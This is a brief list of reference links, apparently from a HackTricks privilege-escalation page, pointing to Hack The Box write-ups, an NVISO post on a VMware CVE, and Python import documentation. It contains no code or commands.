- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../../banners/hacktricks-training.md}}
